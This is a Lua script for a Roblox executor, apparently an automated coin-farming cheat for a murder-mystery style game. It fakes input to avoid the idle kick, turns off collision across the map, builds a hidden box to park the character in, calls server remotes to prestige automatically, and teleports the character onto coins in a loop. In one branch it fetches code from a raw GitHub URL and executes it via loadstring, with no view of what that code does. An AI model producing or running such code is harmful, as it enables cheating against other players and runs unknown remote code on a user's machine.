local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local VirtualUser = cloneref(game:GetService("VirtualUser"))
local player = Players.LocalPlayer
local remotes = ReplicatedStorage:WaitForChild("Remotes")
local playerProfileRemote = remotes:WaitForChild("Misc"):WaitForChild("GetPlayerProfile")
local prestigeRemote = remotes:WaitForChild("Inventory"):WaitForChild("Prestige")

local antiflingConnection
local anchorPosition = Vector3.new(2430, -113, 5824)
local anchorPart
local frontWall
local backWall
local leftWall
local rightWall
local topWall
local currentCharacter

local function idlePlayer()
    local function checkIdle()
        while true do
            Players.LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
            task.wait(3)
        end
    end
    task.spawn(checkIdle)
end

local function startAntifling()
    local function antifling()
        while true do
            if antiflingConnection then
                antiflingConnection:Disconnect()
            end
            antiflingConnection = RunService.Heartbeat:Connect(function()
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= player and p.Character then
                        for _, part in ipairs(p.Character:GetChildren()) do
                            if part:IsA("BasePart") and part.CanCollide then
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end)
            task.wait(3)
        end
    end
    task.spawn(antifling)
end

local function createAnchorPart()
    local function anchorpart()
        while true do
            if not anchorPart or not anchorPart.Parent then
                anchorPart = Instance.new("Part")
                anchorPart.Name = "AnchorPart"
                anchorPart.Size = Vector3.new(70, 1, 64)
                anchorPart.Transparency = 1
                anchorPart.Anchored = true
                anchorPart.CanCollide = true
                anchorPart.CFrame = CFrame.new(2427, -113, 5830, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                anchorPart.Parent = Workspace

                topWall = Instance.new("Part")
                topWall.Name = "TopWall"
                topWall.Size = Vector3.new(68, 1, 62)
                topWall.Transparency = 1
                topWall.Anchored = true
                topWall.CanCollide = true
                topWall.CFrame = CFrame.new(2427, -93.5, 5830, 1, 0, 0, 0, 1, 0, 0, 0, 1)
                topWall.Parent = Workspace

                frontWall = Instance.new("Part")
                frontWall.Name = "FrontWall"
                frontWall.Size = Vector3.new(68, 1, 20)
                frontWall.Transparency = 1
                frontWall.Anchored = true
                frontWall.CanCollide = true
                frontWall.CFrame = CFrame.new(2427, -103, 5798.5) * CFrame.Angles(math.rad(90), 0, 0)
                frontWall.Parent = Workspace

                backWall = Instance.new("Part")
                backWall.Name = "BackWall"
                backWall.Size = Vector3.new(68, 1, 20)
                backWall.Transparency = 1
                backWall.Anchored = true
                backWall.CanCollide = true
                backWall.CFrame = CFrame.new(2427, -103, 5861.5) * CFrame.Angles(math.rad(-90), 0, 0)
                backWall.Parent = Workspace

                leftWall = Instance.new("Part")
                leftWall.Name = "LeftWall"
                leftWall.Size = Vector3.new(20, 1, 64)
                leftWall.Transparency = 1
                leftWall.Anchored = true
                leftWall.CanCollide = true
                leftWall.CFrame = CFrame.new(2392.5, -103, 5830) * CFrame.Angles(0, 0, math.rad(-90))
                leftWall.Parent = Workspace

                rightWall = Instance.new("Part")
                rightWall.Name = "RightWall"
                rightWall.Size = Vector3.new(20, 1, 64)
                rightWall.Transparency = 1
                rightWall.Anchored = true
                rightWall.CanCollide = true
                rightWall.CFrame = CFrame.new(2461.5, -103, 5830) * CFrame.Angles(0, 0, math.rad(90))
                rightWall.Parent = Workspace
            end
            task.wait(5)
        end
    end
    task.spawn(anchorpart)
end


local function findCoinServer()
    for _, descendant in ipairs(Workspace:GetDescendants()) do
        if descendant:IsA("BasePart") and descendant.Name == "Coin_Server" then
            if descendant:GetAttribute("CoinID") == "BeachBall" then
                local coinVisual = descendant:FindFirstChild("CoinVisual")
                if coinVisual and coinVisual.Transparency < 1 and descendant:FindFirstChild("TouchInterest") then
                    return descendant
                end
            end
        end
    end
    return nil
end

local function DeleteYachtTrapSwim()
    local function checkAndDeleteWater()
        while true do
            local path = workspace:FindFirstChild("Yacht")
            
            if path then
                local interactive = path:FindFirstChild("Intereactive")
                if interactive then
                    local water = interactive:FindFirstChild("Water")
                    if water then
                        water:Destroy()
                    end
                end
            end

            task.wait(5)
        end
    end
    task.spawn(checkAndDeleteWater)
end

local function getPlayerProfile(username)
    local args = { username }
    return playerProfileRemote:InvokeServer(unpack(args))
end

local function AutoPrestige()
    task.spawn(function()
        while true do
            local profile = getPlayerProfile(player.Name)
            if profile then
                local level = profile["Level"]
                local prestige = profile["Prestige"]
                if level == 100 and prestige ~= 10 then
                    prestigeRemote:FireServer()
                end
            end
            task.wait(8)
        end
    end)
end


local function waitForHumanoidRootPart(character, timeout)
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then return root end
    local start = tick()
    while not root and tick() - start < timeout do
        root = character:FindFirstChild("HumanoidRootPart")
        task.wait(0.1)
    end
    return root
end

local function onCharacterAdded(char)
    currentCharacter = char
    local root = waitForHumanoidRootPart(char, 10)
    if root and not currentCharacter.PrimaryPart then
        currentCharacter.PrimaryPart = root
    end
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then onCharacterAdded(player.Character) end

local function noclipPart(part)
    if part:IsA("BasePart") and part ~= anchorPart and part ~= frontWall and part ~= backWall and part ~= leftWall and part ~= rightWall and part ~= topWall then
        part.CanCollide = false
    end
end

for _, part in ipairs(Workspace:GetDescendants()) do noclipPart(part) end
Workspace.DescendantAdded:Connect(noclipPart)

idlePlayer()
startAntifling()
createAnchorPart()
DeleteYachtTrapSwim()
AutoPrestige()

while true do
    task.wait(1)

    local success, err = pcall(function()
        if not currentCharacter or not currentCharacter.Parent then return end
        if not currentCharacter.PrimaryPart then
            local root = waitForHumanoidRootPart(currentCharacter, 10)
            if root then currentCharacter.PrimaryPart = root else return end
        end

        local roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
        local isMurderer
        for name, data in pairs(roles) do
            if name == player.Name and data.Role == "Murderer" then
                isMurderer = true
                break
            else
                isMurderer = false
            end
        end

        if isMurderer and player.PlayerGui.MainGUI.Game.CoinBags.Container.BeachBall:FindFirstChild("Full").Visible then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ewqeeqweqeq/test/refs/heads/main/2.lua"))()
        end

        local targetCoin = findCoinServer()
        if targetCoin and player.PlayerGui.MainGUI.Game.CoinBags.Container.BeachBall.Visible and not player.PlayerGui.MainGUI.Game.CoinBags.Container.BeachBall.Full.Visible then
            currentCharacter:SetPrimaryPartCFrame(targetCoin.CFrame * CFrame.new(0, 4, 0))
            task.wait(0.6)
            currentCharacter:SetPrimaryPartCFrame(anchorPart.CFrame + Vector3.new(0, 5, 0))
            task.wait(0.5)
        else
            currentCharacter:SetPrimaryPartCFrame(anchorPart.CFrame + Vector3.new(0, 5, 0))
        end
    end)

    if not success then
        warn("Error occurred: " .. tostring(err))
        task.wait(5)
    end
end
